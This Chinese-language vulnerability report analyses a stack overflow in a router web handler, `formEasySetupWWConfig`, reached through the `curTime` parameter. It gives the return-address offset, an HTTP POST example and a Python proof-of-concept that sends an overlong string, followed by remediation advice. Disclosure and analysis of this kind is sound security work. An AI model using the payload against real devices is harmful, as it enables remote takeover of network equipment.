# 栈溢出漏洞分析报告 - formEasySetupWWConfig

## 漏洞概览
- **漏洞类型**: 栈缓冲区溢出 (Stack Buffer Overflow)
- **风险等级**: 高危 (High)
- **受影响函数**: `formEasySetupWWConfig` (地址: 0x44887c)
- **触发条件**: 通过HTTP请求向`curTime`参数传入超长字符串

## 漏洞详情

### 代码片段
```c
sprintf(v97, "/Basic/Wizard_Easy_SetPassword.asp?t=%s&mode=%d", Var, v4);
```

### 根因分析
该漏洞位于`formEasySetupWWConfig`函数的末尾，使用不安全的`sprintf`函数将用户控制的`curTime`参数直接格式化到栈上的固定大小缓冲区`v97`中。缓冲区`v97`大小为200字节，但用户输入的`curTime`参数长度没有限制。

**关键问题**:
- 缓冲区大小: `v97[200]` (200字节)
- 格式化字符串: `/Basic/Wizard_Easy_SetPassword.asp?t=%s&mode=%d` (约40字节固定长度)
- 剩余空间: 约160字节用于用户输入
- 无长度检查: 直接使用`sprintf`，无边界检查

## 利用分析

### 偏移量计算
基于栈帧布局分析:
- 栈帧总大小: 0x220 (544字节)
- 缓冲区位置: `var_1E8` (偏移量0x18)
- 返回地址位置: `var_s1C` (偏移量0x21c)
- **偏移量**: 0x21c - 0x18 = 0x204 (516字节)

### 利用路径
1. 通过HTTP POST请求向`formEasySetupWWConfig`函数发送恶意数据
2. 控制`curTime`参数内容，构造超长字符串
3. 触发栈缓冲区溢出

### HTTP利用可行性确认
**✅ 确认通过HTTP请求可触发**

**HTTP可控参数**:
- `curTime` - 通过 `websGetVar(a1, "curTime", &dword_488124)` 获取
- `config.wireless.SSID` - 通过 `websGetVar(a1, "config.wireless.SSID", &dword_488124)` 获取

**HTTP请求示例**:
```http
POST /formEasySetupWWConfig HTTP/1.1
Host: target-router
Content-Type: application/x-www-form-urlencoded

curTime=A*516&config.wireless.SSID=test
```

**利用确认**:
- 所有漏洞参数都通过`websGetVar`函数从HTTP请求获取
- 无任何长度检查或输入验证
- 可直接通过POST请求触发漏洞

### Payload 构造
```python
# 构造触发栈溢出的payload
payload = "A" * 516  # 超过缓冲区大小的字符串

# HTTP请求示例
import requests
url = "http://target-ip/formEasySetupWWConfig"
data = {
    "curTime": payload,
    "config.wan_type": "0"
}
response = requests.post(url, data=data)
```

## 结论与建议

### 修复建议
1. **立即修复**: 使用安全的字符串函数替代`sprintf`
   ```c
   // 修复方案
   snprintf(v97, sizeof(v97), "/Basic/Wizard_Easy_SetPassword.asp?t=%s&mode=%d", Var, v4);
   ```

2. **输入验证**: 添加`curTime`参数长度检查
   ```c
   if (strlen(Var) > 150) {
       // 处理过长输入
       return error_response;
   }
   ```

3. **编译保护**: 启用栈保护机制
   - 开启栈保护 (Stack Canary)
   - 启用地址空间布局随机化 (ASLR)
   - 设置不可执行栈 (NX)

### 风险影响
- **远程代码执行**: 攻击者可通过HTTP请求远程执行任意代码
- **设备控制**: 可能完全控制网络设备
- **网络渗透**: 可作为内网渗透的跳板

该漏洞属于高危漏洞，建议立即修复并加强输入验证机制。

---

## 技术细节

### 函数信息
- **函数地址**: 0x44887c
- **函数大小**: 0xf10 (3856字节)
- **调用约定**: MIPS O32

### 栈帧布局
```
栈帧总大小: 0x220 (544字节)
缓冲区位置: 偏移量0x18 (var_1E8)
返回地址: 偏移量0x21c (var_s1C)
```

### 危险函数调用
- `sprintf` (0x449718) - 栈溢出漏洞点
- `strcpy` (0x449734) - 潜在二次溢出风险

### 攻击向量
- **HTTP参数**: `curTime`
- **请求方法**: POST
- **触发路径**: Web配置接口

报告生成时间: 2026-03-04